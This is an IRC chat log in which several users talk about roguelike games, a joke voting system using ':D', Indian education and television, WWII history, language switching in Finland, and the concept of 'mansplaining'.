May 12 16:31:57 <emily>	john_cephalopoda: no, they're usually slow fun :)
May 12 16:32:24 <vehk>	Then again lots of people seem to enjoy Isaac, so there must be either some design choice, or player approach that makes it work
May 12 16:32:25 <emily>	I've not actually played Isaac, but the opinions I hear are usually dismissive, yeah
May 12 16:32:43 <emily>	though the high representation of players of it in necrodancer players makes me think it might have something there
May 12 16:33:17 <john_cephalopoda>	emily: Depends on the game. I've been playing Shattered Pixel Dungeon quite a lot. It has a limited number of levels and the outline of the mission (boss levels, number of levels & end fight) is always the same. The levels differ from play to play though.
May 12 16:33:23 *	SGautam has quit (Ping timeout: 260 seconds)
May 12 16:33:48 <emily>	I guess my point is that classic roguelikes are on some level a puzzle game at heart
May 12 16:34:11 <emily>	and so the amount of time you take tends high as long as they are rich enough
May 12 16:34:19 <emily>	ofc, there's simple scaling factors (# of levels, etc.)
May 12 16:34:29 <emily>	but roguelike-playing just generally seems like more of a "slow" activity than a "quick" one, in spirit :)
May 12 16:34:50 <vehk>	I personally wouldn't say I play roguelikes for quick fun. If I take the stance of "I want quick fun", then roguelikes is the exact opposite of what I'd play
May 12 16:34:55 <vehk>	I'd play something like DOOM
May 12 16:35:04 <vehk>	It's more frustrating when looked at quickly, imo
May 12 16:35:18 <emily>	vehk: yeah, but tbf, Necrodancer is a good fairly-quick-fun option
May 12 16:35:31 <vehk>	True
May 12 16:35:35 <emily>	and there are coffeebreak roguelikes that are downscaled enough to be a nice way to pass a little time
May 12 16:35:44 <emily>	and speedruns, et.c
May 12 16:35:45 <emily>	*etc.
May 12 16:35:49 <emily>	but yeah, the quintessential "spirit" of roguelikes is slow at heart
May 12 16:35:59 <emily>	in rogue, you starve really quickly in game time...
May 12 16:36:05 <emily>	so you have to spend a good amount of real world time avoiding that
May 12 16:36:18 <emily>	although rogue is really a far more luck-based game than the majority of its successors
May 12 16:36:23 <vehk>	mh, yeah
May 12 16:36:38 <emily>	that's the thing - "roguelikes" are not generally particularly Rogue-like
May 12 16:36:46 <emily>	more than they are NetHack-like, Angband-like, Crawl-like, etc.
May 12 16:36:55 <emily>	the centre of the genre shifted away from its origin
May 12 16:37:02 <emily>	brogue is more Rogue-like than most roguelikes
May 12 16:37:05 <FireFly>	is binding of isaac in the "roguelite" category?
May 12 16:37:07 <vehk>	I guess the slow spirit of roguelikes comes exactly from the fact that it transcends the quick game session (because of death, etc), building up to you knowing more about the mechanics to turn bad luck around and get a longer run
May 12 16:37:18 <emily>	FireFly: yes i think so.
May 12 16:37:22 <vehk>	But I dunno, these are all unordered thoughts
May 12 16:37:30 <vehk>	Exactly why I want to play more and distil it.
May 12 16:37:38 <FireFly>	Because BoI definitely feels like the kind of game that one can play a quick round game of
May 12 16:37:43 <emily>	you could make an argument for roguelike on the grounds that sticking to something strict like the Berlin interpretation just means that anything sufficiently creative isn't a roguelike. but I think it breaks the spirit, gameplay-wise
May 12 16:37:50 <emily>	so I think roguelite.
May 12 16:38:05 <vehk>	The one thing very alien to me in the interpretation is non-modality
May 12 16:38:22 <emily>	i forget which one that was
May 12 16:38:38 <vehk>	That every action is available anywhere
May 12 16:38:44 <vehk>	ie at any level, any depth
May 12 16:39:05 <vehk>	Literally that there is no other "mode" you get into
May 12 16:39:11 <vehk>	Like, say, entering a shop
May 12 16:39:31 <emily>	ah, yes...
May 12 16:39:48 <emily>	there are certain ways that correlates with what "makes" a roguelike, to me. but it's wrong to single it out as a core concept
May 12 16:40:08 <emily>	it is true that as the modalities in your game go up, the likelihood you have a roguelike goes down, to some extent, just approximately
May 12 16:40:19 <asecretcat-web>	are there roguelikes that have...something of a strong central RPG story to them?
May 12 16:40:31 <emily>	kind of
May 12 16:40:37 <emily>	you can totally do it
May 12 16:40:42 <emily>	but it'd be novel to do so on a grand scale
May 12 16:40:48 <asecretcat-web>	hmm
May 12 16:40:50 <emily>	there have been attempts that have mostly frizzled
May 12 16:40:53 <emily>	I would *love* to play that game
May 12 16:40:59 <emily>	I think a lot of Japanese dungeon crawlers might come close?
May 12 16:41:01 <emily>	Check out Shiren the Wanderer
May 12 16:41:07 <emily>	and Pokemon Mystery Dungeon
May 12 16:41:19 <asecretcat-web>	ohhh shiren sounds vaguely familiar, snes right?
May 12 16:41:21 <asecretcat-web>	definitely
May 12 16:41:36 <emily>	maybe, portables I think mostly though?

May 12 16:44:51 <FireFly>	The Mystery Dungeon games are really interesting in a way
May 12 16:45:25 <FireFly>	as a kind of mainstream roguelike

May 14 00:18:45 <S_Gautam>	Studying calculus, analytical geometry, mechanics, optics and beating us 16-18 year olds in that.
May 14 00:19:48 <shikhin>	nortti: Looking at the lawlog… I'm tempted to tweet "The tweet is just the image" and attach an image, and then get us to ratify that.
May 14 00:20:09 <S_Gautam>	shikhin, Yeah, I didn't want to go for engineering. Mom and dad insisted to join one because they wanted to feel that they did enough from their side.
May 14 00:20:24 <shikhin>	Your mom and dad joined one too?
May 14 00:20:47 <S_Gautam>	Nah.
May 14 00:20:53 <shikhin>	(Sorry, bad joke.)
May 14 00:21:04 <shikhin>	("Mom and dad insisted to join one")
May 14 00:21:15 <S_Gautam>	oh lol
May 14 00:21:49 <shikhin>	What do you want to study, then?
May 14 00:21:58 <S_Gautam>	Pure sciences
May 14 00:22:08 <shikhin>	There's a lot of science that's pure.
May 14 00:22:09 <S_Gautam>	That's why I'm hoping to get into IISc
May 14 00:23:55 <S_Gautam>	shikhin, It's too early to decide a specialization, but I'm guessing I'd want to work at ISRO or Defence Research, maybe do something to improve the condition of the shithole I'm in basically.
May 14 00:24:29 <shikhin>	Oh boy.
May 14 00:24:53 *	shikhin has heard not so pleasant things about every organization that does defense research.
May 14 00:26:40 <S_Gautam>	Actually, DRDO doesn't just make weapons to point at Pakistan. They've done fairly decent things, there's recently a project to deliver faster internet that's in combination with IISc
May 14 00:28:56 <shikhin>	Er, I'm sure they manage to do something right once in a while; but as an organization, I've heard bad things about just about every major lab.
May 14 00:28:58 <S_Gautam>	It's like really sad, but a lot of our national resources are going into keeping Pak/China alert.
May 14 00:29:59 *	shikhin did ponder interning at CAIR or something but was talked out of it.
May 14 00:30:27 <S_Gautam>	I guess the bureaucracy was shit.
May 14 00:30:33 <shikhin>	Was?
May 14 00:30:38 <S_Gautam>	lol

May 14 00:38:31 <shikhin>	re. the global notice; vehk also temporarily vandalised our topic today.

May 14 20:02:41 <S_Gautam>	I'm not really sure what characters you're using for emoticons because kiwiirc is displaying them as facial expressions.
May 14 20:02:52 <S_Gautam>	like actual emojis
May 14 20:03:05 <shikhin>	…I don't think you can be in this channel with that feature.
May 14 20:03:11 <nanovad>	hehe
May 14 20:03:32 <CompanionCube>	shikhin: this is a good question
May 14 20:03:33 <nanovad>	shikhin: Why would it be a bad idea? Any time you wanted something to be a proposal you could just #propose <whatever> and then everyone votes normally
May 14 20:03:38 <shikhin>	(':-D' without the nose for a vote, 'D-:' without the nose for disapproval.)
May 14 20:03:45 <CompanionCube>	is a vote a vote if it's not displayed as one?
May 14 20:03:58 <nanovad>	yes
May 14 20:04:55 <shikhin>	D-depends on what you mean.
May 14 20:05:08 <S_Gautam>	#propose Add a #legislate command
May 14 20:05:14 <shikhin>	nanovad: What's the advantage in that, though? Tracking proposals isn't the hard part, it's tracking votes that is.
May 14 20:05:56 <nanovad>	eh, suppose so
May 14 20:06:02 <nanovad>	There's so many fucking edge cases in the vote syntax
May 14 20:06:23 *	shikhin nods.

May 14 20:08:29 <CompanionCube>	shikhin: if a client displays :D as an emoji, is it still a :D for them, or is the emoji a different thing?
May 14 20:08:45 <shikhin>	Oh, I think it's definitely still a :D.
May 14 20:09:14 <S_Gautam>	Hm
May 14 20:09:24 <shikhin>	The more interesting question is if a client displays something as :D but it's not :D, is it still a vote? (I think right now it is under the "principle of excess nortti consumption".)
May 14 20:09:29 <S_Gautam>	So if I cut off my finger, my Aadhaar is gone?
May 14 20:09:48 <shikhin>	I think there's exceptions for things like that.
May 14 20:10:04 <S_Gautam>	It says they rely on iris/fingerprint data
May 14 20:10:05 <emily>	w-wait, context?
May 14 20:10:07 <emily>	ah
May 14 20:11:18 <shikhin>	S_Gautam: Yes, but if your fingerprints aren't usable, they can just rely on iris data. (If neither is usable, then I think you just need to live with phone OTPs or something.)
May 14 20:11:28 <sprocklem>	Wait, does :D have to be the two ascii characters?
May 14 20:11:30 <S_Gautam>	lmao wtf
May 14 20:11:36 <sprocklem>	Or are confusables valid?
May 14 20:11:54 <CompanionCube>	sprocklem: I'd assume the confusables aren't
May 14 20:12:08 <CompanionCube>	since they're not the same characters as :D
May 14 20:12:16 <shikhin>	<@sortie> In accordance with new ancient law, zero-width-spaces that proceed an otherwise vote are discarded for the purpose of voting and it is considered a vote, in accordance with the principle of excess consumption of nortti resources.
May 14 20:12:41 <shikhin>	I think more generally, if you manage to trick nortti, it's no biggie and we can keep it as a law. But if we figure it out, we can also delete it.
May 14 20:13:58 <shikhin>	(Or that's my interpretation.)
May 14 20:14:26 <shikhin>	(I think you can probably interpret that as zero-width-spaces *must* be ignored; no idea how that treats other confusables, then.)

May 14 20:16:21 <CompanionCube>	they can precede though
May 14 20:16:31 <shikhin>	Haha.
May 14 20:17:10 <CompanionCube>	and the version of the lawguide is more generic than that
May 14 20:17:21 <CompanionCube>	stating that ZWSPs in votes are to be ignored
May 14 20:17:31 <shikhin>	I'm tempted to propose "Lawfix: in accordance with new ancient law, any confusable ':D' can be treated as a vote until we have a bot to disambiguate votes" or something, but I'll let someone else weigh in on this.
May 14 20:18:19 <CompanionCube>	I would :D: such a proposal.
May 14 20:18:24 <shikhin>	W-why?
May 14 20:18:30 <shikhin>	(That means both that no past law needs to be rechecked, and that once we do have a bot, we don't need to worry about that.)

May 15 01:31:08 <vehk>	As exaggerated as it is, yeah, accurate enough.
May 15 01:32:11 <vehk>	Personally more vested in the continental zone, what with idealism and existentialism
May 15 01:32:30 <nortti>	mh
May 15 01:32:35 <vehk>	Then again the lines are real blurry with the definitions of analytical and continental iirc
May 15 01:33:01 <vehk>	I want to say most of these names come after the actual movements
May 15 01:33:04 <vehk>	And are more a descriptor
May 15 01:33:44 <nortti>	I mean, that's usually what happens. when it's the thing™ that's developing, there's rarely any agreed-upon name
May 15 01:33:47 <vehk>	Yeah
May 15 01:35:31 <nortti>	kinda interested to see whether the term "neo-romantic" is going to stick for the style of literature from turn of millenium onwards
May 15 01:35:49 <vehk>	I think the area you first get in contact with will always somehow have a lasting impression
May 15 01:35:55 <nortti>	mh
May 15 01:36:00 <vehk>	And I guess that's why I stick with exploring more of the existentialist ideas
May 15 01:36:08 <vehk>	Well, my entry was more transcendentalism, but yeah
May 15 01:36:49 <nortti>	hm, I honestly don't know much about that
May 15 01:37:21 <vehk>	It was a very, hm... localized phenomenon, pretty US-centric

May 15 01:40:28 <nortti>	do you think how to categorize those of past, either?
May 15 01:40:36 <vehk>	Yeah, more so
May 15 01:41:07 <vehk>	Less to define them and more to see the movements interact
May 15 01:41:14 <vehk>	And for that you need some sort of word for them
May 15 01:42:17 <vehk>	Whereas today, hm. tbh most of today's philosophy is me thinking about stuff, or reading other people's thoughts - not any discernible singular work you can look at
May 15 01:42:20 <vehk>	It's way more broad
May 15 01:42:32 *	S_Gautam (~GautamS@unaffiliated/gautams) has joined
May 15 01:42:41 <nortti>	right
May 15 01:42:54 <vehk>	And I guess there is a problem in just looking at singular works from history, but also you're never going to get the same broadness
May 15 01:42:59 <vehk>	Since you did not live then and you simply don't have the time
May 15 01:43:12 <S_Gautam>	Why did Germany stay away from Britain?
May 15 01:43:54 <nortti>	reminds me a bit of how in the history of religion in europe from start of modern period to today. until 1900 or so we had this neat cohesive story we were following, and then it split into like five different things that sort of interacted but not really
May 15 01:43:58 <vehk>	S_Gautam: Germany pretty much lost the initiative regarding air-superiority, and the plans for an invasion were then scrapped
May 15 01:44:08 <nortti>	lol
May 15 01:44:10 <S_Gautam>	that's a proper answer
May 15 01:44:14 <S_Gautam>	but
May 15 01:44:22 <S_Gautam>	Because it was gross!
May 15 01:44:31 <vehk>	:p
May 15 01:44:39 <nortti>	:D:
May 15 01:45:09 <nortti>	hm, do you spell that with ß or always ss?
May 15 01:45:20 <vehk>	The former
May 15 01:45:25 <S_Gautam>	I guess in Switzerland they use ss?
May 15 01:45:30 <nortti>	ye
May 15 01:45:33 <nortti>	*yea
May 15 01:45:55 <S_Gautam>	most of my German knowledge is from polandball comics

May 15 01:47:26 <vehk>	Do you know why the split happened, or why until 1900 you have a cohesive story?
May 15 01:47:41 <vehk>	I'd assume that in reality it's not that cohesive, but I don't know much aobut the subject
May 15 01:48:06 <nortti>	the split happened because we actually looked into the specifics this time

May 15 01:48:41 <nortti>	er, and this was our uni course, not history in general
May 15 01:48:44 <S_Gautam>	Huh, interesting.
May 15 01:48:50 <S_Gautam>	So they did attempt to invade by land.
May 15 01:48:55 <S_Gautam>	As in sea -> land
May 15 01:49:12 <vehk>	Nah, there was no attempt, but plans
May 15 01:49:12 <S_Gautam>	I thought the plan was to bomb Britain to force surrender.
May 15 01:49:17 <S_Gautam>	ah
May 15 01:49:25 <vehk>	It was postponed indefinitely
May 15 01:49:36 <vehk>	Well, yes, Germany never really stopped bombing Britain
May 15 01:49:51 <vehk>	Even in the late years you still had V1 and V2 attacks
May 15 01:49:59 <vehk>	More V2, because V1s were trivially easy to intercept then
May 15 01:51:38 <vehk>	Full disclaimer: not a historian, I just happen to know lots about this because I'm interested
May 15 01:51:48 <nortti>	was it v1 or v2 the brits fed false intelligence about the place it hit of?
May 15 01:51:58 <S_Gautam>	Hm, I guess if the plan did succeeded, the British government wouldn't have surrendered even after London fell.
May 15 01:52:11 <vehk>	I think those were the V2s
May 15 01:53:03 <vehk>	Once it was figured out that you could get ordinary planes to tip V1s over and send them crashing in the ocean, they were pretty much useless
May 15 01:53:07 <S_Gautam>	Wow, SVG maps are pretty detailed.
May 15 01:53:26 <nortti>	S_Gautam: if you're interested in ww2, there's https://twitter.com/RealTimeWWII and in the last couple weeks or so we've had the invasion of norway and denmark, and now the invasion of netherlands & belgium. interestingly different cases

May 15 02:53:43 <vehk>	mhm

May 15 02:55:02 <nortti>	(fwiw, "don't worry, we will still love you" is *not* something I want to hear after I go "hey, the gender you forced onto me? not me")
May 15 02:55:16 <vehk>	Yeah, that is a bit weird
May 15 02:55:23 <vehk>	Then again, I can see where it's coming from
May 15 02:55:27 <nortti>	right
May 15 02:56:11 <vehk>	It's just from a weird place -- where it seems you have a default reaction to your kid coming out as X
May 15 02:56:13 <vehk>	I dunno
May 15 02:57:11 <vehk>	I mean I try to also keep telling my parents to be more careful about what they say to my brother (who came out as trans, uh, half a year or so ago?)

May 15 03:02:53 <S_Gautam>	There is customs checks within Schengen?
May 15 03:03:00 <nortti>	yeah
May 15 03:03:09 <S_Gautam>	I thought it was a travel free zone
May 15 03:03:11 <nortti>	there's even "temporary" border checks
May 15 03:03:46 <nortti>	it's free travel zone as long as you're white citizen of a rich EU contry
May 15 03:04:04 <nortti>	well, usually
May 15 03:06:35 <S_Gautam>	true anywhere
May 15 03:06:41 <nortti>	puckipedia: anyways, on this subject™, the big neolib party has, after several years of going "lol, get fucked" at european human rights courts, decided they are actually in favour of a reform to the trans law. it'd remove forced sterilization and make changing your legal gender something you can do without transpoli

May 15 03:13:08 <shikhin_>	I don't think "contacts" help with a US visa. (In particular, you sign an affidavit saying you won't try to influence the visa approval process--and I think they take it fairly seriously.)

May 15 03:41:14 <nortti>	to finish something is communicated with a verb like viedä ‘bring’, saataa ‘to escort’ or hoitaa ‘to take care of’ with the adverbial loppuun ‘into end’
May 15 03:42:03 <nortti>	or with things like saada valmiiksi ‘to get [something] [transformed] into [being] finnished’
May 15 03:42:09 <nortti>	*finished
May 15 03:42:55 <nortti>	or, hm, I guess you can also use valmiiki ‘[transform] into [being] finished’ by itself with the main verb
May 15 03:43:21 <nortti>	e.g. "kirjoitin tekstin valmiiksi" = "I completed writing the text"
May 15 03:46:39 <nortti>	also "finally X is finished" you can say with valmis ‘ready’ or tehty ‘done’
May 15 03:49:36 <S_Gautam>	i see
May 15 03:50:32 <nortti>	it's actually really insteresting how often finnish lacks a common verb in english and instead uses some other way to say it. the kinda canonical examples are to have and to wear
May 15 03:50:33 <S_Gautam>	like, in Hindi we have "takneek" for "technique", "daktar" for "doctor", "afsar" for "officer" etc.
May 15 03:50:54 <nortti>	tekniikka, tohtori, upseeri I think
May 15 03:51:10 <nortti>	but those are likely from swedish
May 15 03:51:38 <nortti>	it's only in the last few decades that finnish has started loaning from english, really
May 15 03:52:50 <S_Gautam>	because american technological dominance
May 15 03:52:58 <nortti>	right
May 15 03:53:16 <nortti>	plus cultural dominance
May 15 03:54:47 <S_Gautam>	yep, these days urban kids here watch more big bang theory and friends than indian TV, not implying it's a bad thing or anything it just is.
May 15 03:56:09 <nortti>	a sitcom about people drinking a lot of drinks with cannabis in them: big bhang theory
May 15 03:56:42 <S_Gautam>	i managed drink it every holi since 14, good stuff, would recommend.
May 15 03:57:29 <nortti>	hm, guess I'd need to come over there for some, since possession of cannabis is illegal here
May 15 03:57:37 <S_Gautam>	just make sure the source is clean and usual india food precautions
May 15 04:01:01 <S_Gautam>	nortti, well cannabis is illegal but the definition excludes bhaang
May 15 04:02:10 <nortti>	ah
May 15 04:04:48 *	shiklet (~shikhin@108.114.119.5) has joined
May 15 04:05:21 <shiklet>	< S_Gautam> yep, these days urban kids here watch more big bang theory and friends than indian TV, not implying it's a bad thing or anything it just is. <- Perhaps because there's no good Indian television? (Except maybe a handful of documentary series.)
May 15 04:06:06 *	shiklet can only think of one half decent Indian sitcom, and it's pretty popular.
May 15 04:06:28 <S_Gautam>	the newer ones are getting better, i don't watch TV except News/Discovery
May 15 04:06:37 <S_Gautam>	Star Plus is still shit 
May 15 04:06:44 <shiklet>	Newer ones... such as?
May 15 04:07:09 <shiklet>	There's a handful of series coming to Netflix, those would be good. But those aren't out yet.
May 15 04:07:41 <S_Gautam>	there's this TV show called Porus about the Mauryans vs Alexander, my mom watches it, from what i've seen the dialogue + SFX isn't cringeworthy
May 15 04:08:26 <shiklet>	Okay, documentaries and maybe historical fiction/drama. (Both aren't exactly popular genres.)
May 15 04:09:31 <S_Gautam>	well by popular if you mean popular with indian moms then probably not
May 15 04:10:19 <shiklet>	Er, or in general; hence the over-representation of non-Indian television shows?
May 15 04:10:55 *	shiklet really ought to have napped on the bus.
May 15 04:11:34 <S_Gautam>	it's not just that
May 15 04:12:19 <S_Gautam>	we are experiencing a culture shift as well
May 15 04:12:33 <shiklet>	Hmm?
May 15 04:13:32 <S_Gautam>	e.g. language, english is pretty much dominating in urban circles
May 15 04:14:16 <S_Gautam>	now this is a massive generalization, but it is true to a large extent. most people in my school conversed in English
May 15 04:14:36 *	shiklet blinks.
May 15 04:14:44 <S_Gautam>	of course, this is restricted to larger cities
May 15 04:14:51 <shiklet>	Most people in my parents' schools conversed in English as well...
May 15 04:15:12 <S_Gautam>	shiklet, really?
May 15 04:15:31 <S_Gautam>	that's a bit different, maybe because my father/mom studied in a state school
May 15 04:15:46 <shiklet>	Hmm.
May 15 04:16:20 <S_Gautam>	take a look at the most popular books that are used by JEE students, all of them are in English
May 15 04:16:44 <shiklet>	Regardless of that, I don't think it's a culture shift thing? There's fairly good movies from the past however many decades... it's just that no one's made good shows (presumably because there has never been a good way to broadcast non-mainstream TV shows before the internets)?
May 15 04:17:03 <shiklet>	Er, in India, and easily.
May 15 04:18:20 <S_Gautam>	i'm guessing it's a mixture of both :D
May 15 04:21:21 <shiklet>	Hmm, Malgudi Days. Have heard people praise that, maybe I should watch it.
May 15 04:21:31 <john_cephalopoda>	English shows with subtitles should suit most of the people who don't speak English.
May 15 04:22:50 <john_cephalopoda>	In Germany, most movies are dubbed. Pretty much the biggest and most sophisticated dubbing industry worldwide. Fandubs of animes are often better than the English official dub :þ
May 15 04:23:41 <john_cephalopoda>	Damn, I watch really little TV.
May 15 04:23:44 <shiklet>	There's a fair amount of dubbed movies in regional languages, but I don't think I'll be watching any (and neither have I heard any dub being praised for how good it is).
May 15 04:24:31 <john_cephalopoda>	https://en.wikipedia.org/wiki/The_Persuaders!#Redubbed_versions :þ

May 15 04:27:59 <john_cephalopoda>	Also in one scene they park in the middle of a place and put a "doctor at work" sign on the car window. In the German dub, one of them says: "Mach ich beim ZDF auch immer so." (I always do the same thing at the ZDF [German tax-paid broadcaster])
May 15 04:28:35 <shiklet>	Haha.
May 15 04:29:04 <john_cephalopoda>	"Hände hoch – ich bin Achselfetischist!" (Hands up – I am an armpit fetishist!)

May 15 04:29:59 <shiklet>	Oh, right, isn't that in one of the NCERT hindi textbooks?
May 15 04:30:03 <S_Gautam>	Yup
May 15 04:30:14 <shiklet>	Hehe; I'm surprised I remembered.
May 15 04:30:24 <S_Gautam>	it was a funny story by NCERT standards
May 15 04:30:38 <shiklet>	Did not remember / know it was written by Chekhov.
May 15 04:31:13 <asecretcat-web>	hrm...perhaps i could ask here actually...
May 15 04:31:47 <asecretcat-web>	shiklet: S_Gautam: how close is the cooking on this channel to various styles of indian cooking? https://www.youtube.com/channel/UCSVellbrvlxvpi6b5-YQzVQ/videos
May 15 04:32:21 <asecretcat-web>	(background, it's a youtube where a cook in his farming village films his various recipes he's cooked for everyone)
May 15 04:32:22 <S_Gautam>	it's about a policeman who offers a worker justice, but then gets to know that the dog belongs to a Russian officer, blames the worker, then someone tells him the dog belongs to someone else, so he offers him justice again, finally the whole thing gets so confused, the conclusion is that the dog is left astray and the worker is stupid
May 15 04:32:49 *	shiklet is on a bus with crappy internets, but he'll take a look when he's not on a bus.
May 15 04:32:56 <john_cephalopoda>	Tony Curtis understands German and when he saw the dub he was so amazed that he wanted the guy who made the dub to write the screenplay for the next seasons. Series was cancelled though and it never happened.
May 15 04:32:58 <S_Gautam>	asecretcat-web, unfortunately i can't comment
May 15 04:33:18 <S_Gautam>	it looks like they cook non-vegetarian food, i have only tasted chicken 2 times in my life

May 15 04:36:49 <john_cephalopoda>	Wait, the House of Lords is filled with people who inherited their title and not with people who were elected?
May 15 04:36:54 <shiklet>	S_Gautam: The only piece I remember from any Hindi literature class was the Rani ki Jhansi poem.
May 15 04:37:11 <S_Gautam>	i don't remember that
May 15 04:37:36 <S_Gautam>	hindi course is actually split into Course A and Course B
May 15 04:37:42 <S_Gautam>	so it's up to your school i guess
May 15 04:37:46 <shiklet>	Oh?
May 15 04:37:47 <shiklet>	Huh.
May 15 04:38:25 <S_Gautam>	yeah, I bet they didn't teach you the entire history book
May 15 04:38:31 <shiklet>	Right.
May 15 04:39:03 <shiklet>	john_cephalopoda: Quick google search and it seems pretty complicated with some appointed members and some hereditary peers.
May 15 04:39:25 <john_cephalopoda>	Yeah. That seems relatively undemocratic.
May 15 04:39:28 <S_Gautam>	we had Nazism, European printing press and Feudalism in Europe, and Indian independence
May 15 04:39:40 <S_Gautam>	Russian Socialism was there in the book but was not taught
May 15 04:39:44 <shiklet>	All in one year?
May 15 04:39:48 <S_Gautam>	yeah
May 15 04:40:26 <shiklet>	Hrm; I don't remember all of that being clubbed together. We talked about the Nazis, India's independence... can't recall much else.
May 15 04:40:50 <shiklet>	History teaching in my school was definitely not good.
May 15 04:42:04 <S_Gautam>	history class was by far better, our teacher wasn't a robot and actually let us argue politics in our class
May 15 04:42:33 <shiklet>	Mmm.
May 15 04:42:36 <S_Gautam>	hindi was the worst, our hindi teacher was a diehard patriot and propaganda parrot
May 15 04:43:12 *	shiklet 's Hindi teacher was always fairly annoyed by how terrible he was at speaking Hindi.

May 15 04:55:33 <S_Gautam>	at least they didn't mock you, one of the students in Hindi happened to be from the South and he was constantly mocked for not being able to speak properly, it only stopped after someone in our class uttered "Go back to Madras" and then it got serious and a complaint went from his parents
May 15 04:55:54 <shiklet>	...sigh.

May 15 07:19:48 <john_cephalopoda>	I don't get why people use google's fonts.
May 15 07:31:47 <john_cephalopoda>	It's not like 18KB or even 1MB matter when you use several MB of JS and generated HTML with 100s of MB of video and images.
May 15 07:57:49 <vehk>	I dunno, you can use the fonts without loading them from Google's servers, and you don't even need JS to load them.
May 15 07:58:18 <vehk>	I load 4 fonts on my website if you don't have them, and it's just extra CSS and about 15kb per font.

May 15 08:05:42 <shiklet>	Right now planning to go to some museum or some park.

May 15 08:07:50 <shiklet>	Or exclusively art museum.
May 15 08:08:02 <shiklet>	Out of fear to not "get" anything.
May 15 08:08:19 <vehk>	Ah
May 15 08:08:37 <vehk>	There seems to be a nice aquarium there.
May 15 08:08:40 <shiklet>	T-the person sitting next to me in this random mall is speaking some foreign language I can't recognize... except he's repeatedly shouting "direktor [...] FBI".

May 15 08:09:36 <shiklet>	consulate, even
May 15 08:09:52 <vehk>	Ah, sure.
May 15 08:10:01 <shiklet>	Ah, MA has two-party consent.
May 15 08:10:03 <vehk>	Just that that word is German.
May 15 08:10:06 <vehk>	(No, not FBI!)
May 15 08:10:28 <shiklet>	Ah, hehe; obviously I'm just guessing that's how they would spell it.

I say thanks and go fetch it. I arrive back, start 
May 15 08:57:54 <nortti>	loaning it, and then that same person asks me (in finnish) "Are you trying to loan it?"
May 15 08:58:57 <nortti>	like, all our prior conversation had been in swedish. do I say "tack" to strongly finnishly it makes people think I don't speak swedish well enough?
May 15 09:12:21 *	magnificrab has quit (Remote host closed the connection)
May 15 09:12:34 <vehk>	Couldn't say, although maybe the person was just more comfortable speaking Finnish? I've never been in a situation in which I could select from two languages that were understood
May 15 09:12:55 <vehk>	It seems somehow natural (although weird) to default to what you think is the native language of the other

May 15 09:13:23 <vehk>	If I were approached in another language I could speak as well, I'd try my best to just communicate in that language, though
May 15 09:13:26 <vehk>	Is more respectful
May 15 09:14:47 <nortti>	right
May 15 09:15:59 <nortti>	just, like, I'm in a swedish-speaking university's library where all signage is in swedish in a bilingual country where almost everyone is expected to speak at least the basics of swedish and I spoke (and understood) swedish earlier
May 15 09:16:33 <vehk>	mmh
May 15 09:17:14 <vehk>	Honestly no clue. Easy to say you could have asked, but I probably wouldn't even have done that myself.

May 15 09:42:29 <FireFly>	but >.>
May 15 09:42:43 <FireFly>	it's really easy to switch over to another language if that works significantly more smoothly
May 15 09:42:50 <FireFly>	I think it's kind of human to try to minimize friction in communication?
May 15 09:42:57 <FireFly>	if that makes sense
May 15 09:43:10 <FireFly>	Like after all the goal of communication is to exchange information
May 15 09:43:20 <FireFly>	I feel a bit bad actually for speaking too much english when nortti was over >.<
May 15 09:43:50 <nortti>	not like I tried to speak swedish that much, either
May 15 09:44:52 <nortti>	(that one time I asked you "vad är det där?" about slack was actually out of habit, where I code-switch into swedish for some simple questions)
May 15 09:46:52 <vehk>	Reminds me how ybden always wants me to talk more German
May 15 09:47:46 <vehk>	Anyway, I do agree that it's easier to switch over to another language, but it's also interesting trying to speak in the original one, whether it's challenging or not
May 15 09:48:48 <vehk>	And whilst I'd possibly agree that the common goal of communication is to exchange information, I find it to be a bit too reductionist.
May 15 09:49:07 <vehk>	Like, it's very easy to somehow come to the conclusion then that language is inefficient
May 15 09:49:46 <FireFly>	I guess
May 15 09:49:49 <FireFly>	nortti: fair
May 15 09:51:44 <nortti>	language is actually fairly efficient in conveying fuzzy information over a really noisy channel

May 15 09:55:48 <FireFly>	yeah, I agree with that..
May 15 09:56:09 <FireFly>	I think it's just the limited field-of-view that gives that effect

May 15 10:40:43 <john_cephalopoda>	Hmm, I got quieted in ##feminism for "mansplaining".
May 15 10:40:58 <nortti>	did you?
May 15 10:42:22 <john_cephalopoda>	Nope, I just tried to explain my position as as detailed as possible, as I always do to prevent misunderstandings.

May 15 10:42:36 <john_cephalopoda>	Also I don't assume genders on the internet, especially not on IRC.
May 15 10:42:58 *	nanovad . o O ( Everyone is internetkin until proven otherwise )
May 15 10:43:14 <nortti>	that… has nothing to do with gender?
May 15 10:44:19 <john_cephalopoda>	Huh, isn't mansplaining about men assuming that women are not intelligent and need long explanations to understand anything?
May 15 10:44:54 <nortti>	that was re. nanovad's
May 15 10:45:05 <john_cephalopoda>	Ah.
May 15 10:46:02 <nortti>	but basically, yea. maybe I'd define it not quite that strongly, more like "when a man gives an unneeded explanation due to (often subconscious) biaes about expertise of women"
May 15 10:47:34 <john_cephalopoda>	Yeah, that sounds closer to it.
May 15 10:48:06 <john_cephalopoda>	Well, now I can't speak in ##feminism any more, only listen.
May 15 10:48:39 <john_cephalopoda>	Actually since two months ago or so. I already wondered why people kept ignoring my interjections.
May 15 10:48:51 <vehk>	lol?
May 15 10:48:55 <nortti>	:D:
May 15 10:50:30 <vehk>	But I don't know, I find the concept of mansplaining to be a very very slippery one. Like, the core concept of disregarding one's expertise and somewhat claiming attention is what I'd focus on.
May 15 10:50:32 <john_cephalopoda>	Just before I was quieted for mansplaining, some channel members actually asked me to elaborate on my statements :D:
May 15 10:50:44 <nortti>	heh…
May 15 10:50:45 <vehk>	Because, like, you can mansplain without being a man.
May 15 10:50:58 <nortti>	mh
May 15 10:51:12 <john_cephalopoda>	"<********> john_cephalopoda: you are using a EXISTS proof to supporta FOR ALL statement; this is logically erroneous, please reformulate"
May 15 10:51:13 <nortti>	I'd say the power dynamic also plays a factor
May 15 10:51:16 <olsner>	my mom does a lot of momsplaining/womansplaining
May 15 10:51:31 <emily>	mainsplaining, like manspreading, is somewhat overwrought as a concept
May 15 10:51:32 <vehk>	nortti: Right, which does go hand in hand with common power distributions
May 15 10:51:41 <emily>	as always there is a true core and then what's at the top is mostly nonsense
May 15 10:51:50 <vehk>	mh
May 15 10:51:51 <john_cephalopoda>	emily: Manspreading sounds very NSFW
May 15 10:51:53 <emily>	*manpslaining
May 15 10:52:04 <vehk>	. o O ( manslaying )
May 15 10:52:12 <olsner>	indeed, manspreading is No Subway For Women
May 15 10:52:35 <olsner>	or No Space For Women more generally
